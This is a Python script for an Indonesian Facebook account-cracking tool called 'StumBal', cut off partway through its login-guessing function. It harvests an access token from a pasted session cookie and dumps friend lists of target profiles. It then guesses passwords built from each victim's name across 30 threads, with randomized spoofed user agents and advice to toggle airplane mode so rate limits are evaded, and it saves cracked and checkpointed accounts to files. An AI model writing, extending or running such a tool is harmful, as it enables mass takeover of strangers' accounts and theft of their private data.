#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re,subprocess
import urllib3,rich,base64
from bs4 import BeautifulSoup as par
from rich import print as prints
from rich.panel import Panel
from rich.tree import Tree
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from concurrent.futures import ThreadPoolExecutor as tred
#### BAHAN ####
ugen=[]
ugen2=[]
cokbrut=[]
ses=requests.Session()
princp=[]
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[]
taplikasi=['no']
cokbrut=[]
method = []
pwpluss,pwnya=[],[]
#### warna ####
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
color_text = "[#00C8FF]"
color_panel = "#00C8FF"
asu = random.choice([m,k,h,u,b])
color_text = "[#00C8FF]"
color_panel = "#00C8FF"
bgp = f"{M2}•{K2}•{H2}•{P2}"
#### hasil simpan####
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

def ua_sendiri():
	rr = random.randint
	android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
	model_device = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
	build_device = subprocess.check_output("getprop ro.build.id",shell=True).decode("utf-8").replace("\n","")
	ua = f"Mozilla/5.0 (Linux; Android {android_version}; {model_device} Build/{build_device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(104,109))}.0.0.0 Mobile Safari/537.36"
	ua_uc = f"Mozilla/5.0 (Linux; U; Android {android_version}; en-US; {model_device} Build/{build_device}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,150))}.0.{str(rr(3400,4600))}.{str(rr(40,150))} UCBrowser/13.4.0.1306 Mobile Safari/537.36"
	ua_op = f"Mozilla/5.0 (Linux; Android {android_version}; {model_device} Build/{build_device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,150))}.0.{str(rr(3400,4600))}.{str(rr(70,153))} Mobile Safari/537.36 OPR/63.3.3216.58675"
	return str(random.choice([ua,ua_uc,ua_op]))

def ua_nama():
	rr = random.randint
	versi = random.choice(["6.1.0","7.1.0","8.1.0","9","10","11","12"])
	ua = f"Mozilla/5.0 (Linux; Android {versi}; BASARI-ID Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,109))}.0.{str(rr(4200,4600))}.{str(rr(120,140))} Mobile Safari/537.36 OPT/1.7.21"
	ua3 = f"Mozilla/5.0 (Linux; Android {versi}; MEMEK-ID Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,109))}.0.{str(rr(4200,4600))}.{str(rr(120,140))} Mobile Safari/537.36 OPT/1.7.21"
	ua4 = f"Mozilla/5.0 (Linux; U; Android {versi}; Mi A3 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(81,103))}.0.{str(rr(4200,4800))}.{str(rr(40,99))} Mobile Safari/537.36 OPR/52.2.2254.54723"
	return random.choice([ua,ua4])
	
def ua_keren():
	rr = random.randint
	a1 = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	a2 =random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	ua = f"Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0){a1}{str(rr(200,900))}{a2}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2 Chrome/{str(rr(60,109))}.0.{str(rr(3200,3600))}.{str(rr(40,90))} TV Safari/537.36"
	ua2 = f"Mozilla/5.0 (SMART-TV; Linux; Tizen 4.0){a1}{str(rr(200,900))}{a2}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 /{str(rr(60,109))}.0.{str(rr(3200,3600))}.{str(rr(40,90))} TV Safari/537.36"
	ua3 = f"Mozilla/5.0 (SMART-TV; LINUX; Tizen 6.5){a1}{str(rr(200,900))}{a2}) AppleWebKit/537.36 (KHTML, like Gecko) /{str(rr(60,109))}.0.{str(rr(3200,3600))}.{str(rr(40,90))}/6.5 TV Safari/537.36"
	ua4 = f"Mozilla/5.0 (SMART-TV; Linux; Tizen 2.2){a1}{str(rr(200,900))}{a2}) AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.0 TV Safari/538.1"
	return random.choice([ua,ua2,ua3,ua4])
	
ugen=[]
for xd in range(1000):
    rr = random.randint; rc = random.choice
    aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
    fbpn = ["com.facebook.adsmanager","com.facebook.lite","com.facebook.orca","com.facebook.katana","com.facebook.mlite"]
    merek =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269", "RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
    kage = ['es-es','nl-nl','zh-CN','uk-us','ar-ae','ru-ua','tr-tr','zh-cn','ko-kr','ja-jp','ar-eg','en-ca','de-de','pl-pl','cs-cz','es-co','sl-si','en-ph','en-za','en-bh','fa-ir','it-it','es-mx','ru-us','cs-cz','ro-ro','ru-ru','en-us','en-gb','zh-zh','zh-cn','en-GB','en-US','fr-fr','zh-fr','my-zg']
    oo = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
    oio = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
    sama = ['A8000','I9105','I9060C','S5360','T315','G355H','I9100','I9100','N8010','S5830','S7580','S6810M','N7000','N7000','N7000XXLTA','S5360','P5210','I9300','S5312','I9003','P5100','T111','I9100G','S5830i','P5100','P5100','P7500','S6312','I9000','T769','S6802','T311','P7300','P3100','N8000','T310','G360H','I8190','S5369','I8552','T110','N900T','S5300','I8160','P3100','P6800','I9060I','I9100','I9300I','P7500','P7501','I9070','I9001','S5690','P6200']
    gt = ['GT','SM','SAMSUNG']
    pao= ['5.1.1','4.4.2','5.1','12','10','8','9']
    realmepro = f"Mozilla/5.0 (Linux; Android {str(rr(5,12))}; {str(rc(merek))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,87))}.0.{str(rr(111,4280))}.{str(rr(10,141))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(10,100))}.0.0.8;FBBV/5334568;FBDM/density=2.75,width=1080,height=2179;FBLC/id_ID;FBCR/XL;FBMF/Realme;FBBD/Realme;FBPN/{str(rc(fbpn))};FBDV/{str(rc(merek))};FBSV/{str(rr(5,30))};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ciuh = f"mozilla/5.0 (linux; u; android {str(rr(1,4))}.{str(rr(1,2))}.{str(rr(1,2))}; en-us; evercoss a7r build/jdq39) applewebkit/534.30 (khtml, like gecko) version/{str(rr(1,4))}.0 ucbrowser/{str(rr(1,11))}.0.{str(rr(1,8))}.{str(rr(100,855))} u3/0.{str(rr(1,8))}.0 mobile safari/534.36"
    sui = f"Mozilla/5.0 (Linux; U; Android {str(rr(1,6))}.{str(rr(1,6))} en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/{str(rr(1,4))}.0 Mobile Safari/533.1 baidubrowser/{str(rr(1,4))}.{str(rr(1,5))}.0.0 (Baidu; P1 {str(rr(1,6))}.0)"
    peccak = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(1,12))}; M2007J20CG MIUI/V{str(rr(1,12))}.0.{str(rr(1,10))}.0.QJGMIXM) [FBAN/FB4A;FBAV/{str(rr(10,22))}.0.0.0.4;FBLC/in_ID;FBBV/4998186;FBCR/XL;FBMF/Xiaomi;FBBD/POCO;FBDV/M2007J20CG;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/density=2.75,width=1080,height=2179;FB_FW/1;]"
    peecak = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))} {str(rc(aZ))}{str(rr(111,9999))}{str(rc(aZ))}{str(rr(1,99))}{str(rc(aZ))}{str(rc(aZ))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,9999))}.{str(rr(10,500))} Mobile Safari/537.36"
    pecaak = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}.{str(rr(4,12))}; iCherry {str(rc(aZ))}{str(rr(100,600))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,104))}.0.{str(rr(111,9999))}.{str(rr(10,500))} Mobile Safari/537.36"
    paok = f"Mozila/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebkit/{str(rr(10,605))}.{str(rr(1,10))}.{str(rr(1,15))} (KHTML, like Gecko) Version/{str(rr(1,15))}.{str(rr(1,10))}.{str(rr(1,10))} Safari/{str(rr(10,605))}.{str(rr(1,10))}.{str(rr(1,15))}"
    se = f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,107))}.0.{str(rr(4200,4900))}.{str(rr(30,250))} Safari/537.36 Edg/{str(rr(30,107))}.0.{str(rr(1200,2900))}.{str(rr(30,250))}"
    se1 = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,107))}.0.{str(rr(4200,4900))}.{str(rr(30,250))} Safari/537.36 Edg/{str(rr(30,107))}.0.{str(rr(1200,2900))}.{str(rr(30,250))}"
    stri = f"Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,80))}.0.{str(rr(111,5555))}.{str(rr(1,99))} Mobile Safari/537.36 AlohaBrowser/{str(rr(1,9))}.{str(rr(1,20))}.{str(rr(1,40))}"
    v6 = f"Mozilla/5.0 (Linux; Android 6.0.0; M2006C3MNG)AppleWebKit/537.36 (KHTML, like Gecko)Chrome/{str(rr(55,109))}.108.0.0.0.{str(rr(4500,4900))}.{str(rr(72,189))}  Mobile Safari/537.36"
    pecakk = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,9))}.{str(rr(1,9))}.{str(rr(1,9))}; {str(rc(kage))}; {str(rc(gt))}-{str(rc(sama))} Build/{str(rc(oo))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/{str(rr(1,9))}.0.0.{str(rr(99,999))} U3/0.{str(rr(1,9))}.0 Mobile Safari/534.30 AliApp(TB/{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(1,9))}) WindVane/{str(rr(1,9))}.0.0 {str(rr(1000,1900))}X{str(rr(1000,1999))} GCanvas/{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(19,99))}"
    sygalya = random.choice([realmepro,ciuh, sui,peccak, peecak, pecaak, paok,se, se1, stri, pecakk, v6])
    ugen.append(sygalya)

def k():
	rr = random.randint
	a1 = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	a2 =random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	pub = random.choice(["PEXM00","PBCM30","PGU110","PEUM00"])
	ua = f"Mozilla/5.0 (Linux; Android 10; {str(rr(1,16))}; SM-M3 17F/DSN){a1}{str(rr(100,900))}{a2}) Applewebkit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.{str(rr(11111,99999))}.0.{str(rr(1111,9999))}.{str(rr(1,99))} Mobile Safari/537.36 EdgA/17.0.165{a1}"
	ua2 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(10,16))}_{str(rr(0,9))}_{str(rr(0,9))} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 MQQBrowser/13.6.6 Mobile/15E148 Safari/604.1 QBWebViewUA/2 QBWebViewType/1 WKType/1"
	ua3 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(10,16))}_{str(rr(0,9))} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{str(rr(80,110))}.0.{str(rr(3200,5600))}.{str(rr(40,90))} Mobile/15E148 Safari/604.1"
	ua4 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(10,16))}_{str(rr(0,9))} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1 OPX/1.5.2"
	return random.choice([ua,ua2,ua3,ua4])
	
redmi = []
kontol = []
sagne = []
for x in range(10):
        rr = random.randint
        rc = random.choice
        A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
        B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
        C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
        D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
        se = f'{A}{B}{C}{D}'
        if se in redmi:pass
        else:redmi.append(se)
        
def uan():
	rr = random.randint
	a1 = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	a2 =random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	ua = f"Mozilla/5.0 (Linux; Android {str(rr(9,11))}; {str(rr(1,12))}; vivo 1901 Build/PPR1.1806{str(rr(0,9))}0.011; wv){a1}{str(rr(111,999))}{a2}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,110))}.0.{str(rr(3400,5555))}.{str(rr(22,140))} Mobile Safari/537.36 [FB_IAB/Orca-Android; FBAV/266.0.0.16.117;]"
	uak = f"Mozilla/5.0 (Linux; Android {str(rr(9,11))}; {str(rr(1,12))}; vivo 1904 Build/PPR1.1806{str(rr(0,9))}0.011; wv){a1}{str(rr(111,999))}{a2}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,110))}.0.{str(rr(3400,5555))}.{str(rr(22,140))} Mobile Safari/537.36 [FB_IAB/Orca-Android; FBAV/285.0.0.17.119;]"
	uk = f"Mozilla/5.0 (Linux; U; Android {str(rr(9,11))}; fr-fr; vivo 1901 Build/RP1A.200720.012){a1}{str(rr(111,999))}{a2}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,110))}.0.{str(rr(3400,5555))}.{str(rr(40,140))} Mobile Safari/537.36 PHX/9.1"
	return random.choice([ua,uak,uk])
	
def nnn():
	rr = random.randint
	ua = f"Mozilla/5.0 (Linux; Android {str(rr(9,11))}: M2006C3LG) AppleWebKit/537. 36 (KHTML, like Gecko) Chrome/{str(rr(70,110))}.0.{str(rr(4100,4400))}.{str(rr(40,140))} Mobile Safari/537.36"
	return ua

def banner():
	prints(Panel(f"""{P2}_____________                     ________         ______
__  ___/__  /_____  _________ ___ ___  __ )______ ____  /
{B2}_____ \ _  __/_  / / /__  __ `__ \__  __  |_  __ `/__  / 
____/ / / /_  / /_/ / _  / / / / /_  /_/ / / /_/ / _  /  
{M2}/____/  \__/  \__,_/  /_/ /_/ /_/ /_____/  \__,_/  /_/   
 
      {P2}    SHELLY SCOTT ASLI WONG JAWAK """,title=f"{bgp} "+str(tgl)+' '+str(bln)+' '+str(thn)+f" {bgp}", subtitle=f"",width=80,padding=(0,5),style='#FFFFFF'))
#### login ####
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			print(f"{H}•{P} internet tidak ada")
			exit()
	except IOError:
		login_lagi334()
		
def login_lagi334():
	try:
		os.system('clear')
		banner()
		#info() 
		ses = requests.Session()
		cookie = input(f"{H}•{P} masukan {H}cookie {P}anda :{H} ")
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		tokenw = open(".token.txt", "w").write(tok)
		cokiew = open(".cok.txt", "w").write(cookie)
		prints(Panel(f"{H2}{tok}{P2}"))
		print(f"{H}•{P} berhasil login")
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f"{H}•{P} cookie {M}expired {P}")
		exit()

def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print(f"{H}•{P} cookie {M}expired {P}")
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	prints(Panel(f"{H2}selamat datang{B2} "+str(my_name)+f" {H2}di tools StumBal facebook,dimohon gunakan tools dengan bijak ya.",title=f"halo,selamat datang 😁",width=80,padding=(0,3),style='#FFFFFF'))
	prints(Panel(f"""     {P2}[{H2}01{P2}]. {H2}crack teman           {P2}[{H2}02{P2}]. {H2}crack teman massal{P2}
     {P2}[{H2}03{P2}]. {H2}crack dari file{P2}       [{H2}04{P2}]. {M2}hapus login{P2}  """,title="menu",width=80,padding=(0,3),style='#FFFFFF'))
	winj = input(f"[{H}1/4{P}] pilih menu : ")
	if winj in ['1']:
		dump_publik()
	elif winj in ["2"]:
		dump_massal()
	elif winj in ["3"]:
		xnfile()
	elif winj in ['5']:
		result()
	elif winj in ['4']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cok.txt')
		print(f"{H}•{P} berhasil hapus cookie")
		exit()
	else:
		print(f"{H}•{P} input kelur jalur")
		back()

def dump_publik():
	try:
		token = open('.token.txt','r').read()
		kukis = open('.cok.txt','r').read()
	except IOError:
		exit()
	prints(Panel(f"{H2}masukan id target, pastikan id target bersifat publik dan tidak private{P2}",title=f"ketik {B2}me{P2} untuk dump dari teman sendiri",width=80,padding=(0,3),style='#FFFFFF'))
	pil = input(f"{H}•{P} masukan id atau username : ")
	try:
		koh2 = requests.get('https://graph.facebook.com/v5.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
		for pi in koh2['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		prints(Panel(f"{H2}berhasil mengumpulkan{P2} "+str(len(id))+f" {H2}id",width=80,padding=(0,18),style='#FFFFFF'))
		#print(x+m+''+x+' Total Id Collected \033[32m'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f"{H}•{P} internet tidak ada")
		exit()
	except (KeyError,IOError):
		prints(Panel(f"{H2}pertemanan tidak publik atau cookie anda expired",width=80,padding=(0,12),style='#FFFFFF'))
		exit()
		
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f"{H}•{P} masukan total target : "))
	except ValueError:
		
		exit()
	if jum<1 or jum>100:
		print(f"{H}•{P} gagal dump")
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'{P}[{H}'+str(yz)+f'{P}] : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v5.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			
			exit()
	try:
		print('')
		prints(Panel(f"{H2}berhasil mengumpulkan{P2} "+str(len(id))+f" {H2}id",width=80,padding=(0,18),style='#FFFFFF'))
		setting()
	except requests.exceptions.ConnectionError:
		print(f"{H}•{P} jaringan bermasalah")
		back()
	except (KeyError,IOError):
		prints(Panel(f"{H2}pertemanan tidak publik atau cookie anda expired",width=80,padding=(0,12),style='#FFFFFF'))
		time.sleep(3)
		back()
		
def xnfile():
	try:_luxine = os.listdir('RKING')
	except FileNotFoundError:
		print(' Helo Word Harap Buat File Terlebih Dahulu Nama Kan File itu RKING dan isi dalam nya pake file dump kamu jika tidak tau silakan chet wahtsap admin terimakasih><')
		time.sleep(2)
		back()
	if len(_luxine)==0:
		print('Maaf Sebelumnya Buat File Dump Id mu Terlebih Dahulu Dan Pindahkan File Dump Id itu Ke /sdcard/RKING Lalu Jalankan ulang script ini thanks')
		time.sleep(2)
		back()
	else:
		_meledak_ = 0
		_doar_ = {}
		for isi in _luxine:
			try:hem = open('RKING/'+isi,'r').readlines()
			except:continue
			_meledak_+=1
			if _meledak_<100:
				nom = ''+str(_meledak_)
				_doar_.update({str(_meledak_):str(isi)})
				_doar_.update({nom:str(isi)})
				prints(Panel(f"{P2}[{H2}{nom}{P2}]. {H2}total id {B2}{len(hem)}{P2}"))
				#print(f'{H}•{P} {nom}{P}] {P}{isi} total id {H}{len(hem)}{P}')
			else:
				_doar_.update({str(cih):str(isi)})
		geeh = input(f'\n{H}•{P} pilih nomor file : ')
		try:geh = _doar_[geeh]
		except KeyError:
			time.sleep(3)
			back()
		try:lin = open('RKING/'+geh,'r').read().splitlines()
		except:
			print('File Tidak Ada Maad')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()

def setting():
	prints(Panel(f"""[{H2}01{P2}] {H2}tahun tua > muda{P2}
[{H2}02{P2}] {H2} tahun muda > tua{P2}
[{H2}03{P2}] {H2} tahun random tua dan muda{P2}""",title=f"urutan tahun crack",width=80,padding=(0,16),style='#FFFFFF'))
	hu = input(f"[{H}1/3{P}] pilih menu : ")
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(f"{H}•{P} input keluar")
		exit()
	prints(Panel(f"""[{H2}01{P2}]. {H2}m.facebook.com{P2}
[{H2}02{P2}]. {H2}free.facebook.com{P2}
[{H2}03{P2}]. {H2}mbasic.facebook.com{P2}""",title=f"metode validate",width=80,padding=(0,16),style='#FFFFFF'))
	gua=input(f"[{H}1/3{P}] pilih menu : ")
	if gua in ["1","01"]:
		method.append('mobile')
	elif gua in ["2","02"]:
		method.append('mobile')
	elif gue in ["3"]:
		method.append('mobile')
	else:
		method.append('mobile')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	global prog,des
	prints(Panel(f"""{H2}hasil OK tersimpan ke : OK/{okc}
{K2}hasil CP tersimpan ke : CP/{cpc}""",width=80,padding=(0,15),style='#FFFFFF'))
	prints(Panel(f"""{H2}mainkan mode pesawat {P2}({M2}on/off{P2}) {H2}ketika tidak ada {B2}hasil/300-500{H2} id berjalan,dikarenakan potensi spam metode validate terlalu tinggi,dianjurkan untuk memainkan mode pesawat secara berkala untuk menghindari adanya spam ip{H2}.  Terimakasih,semoga beruntung.""",width=80,padding=(0,3),style='#FFFFFF'))
	prog = Progress(SpinnerColumn('smiley'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ses = requests.Session()
	session = requests.Session()
	yaso = random.choice(["sam","qq"])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen)
	#ua = "Mozilla/5.0 (Linux; Android 11; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Stargon/5.0.1 Chrome/108.0.5359.128 Mobile Safari/537.36"
	prog.update(des,description=f"{loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
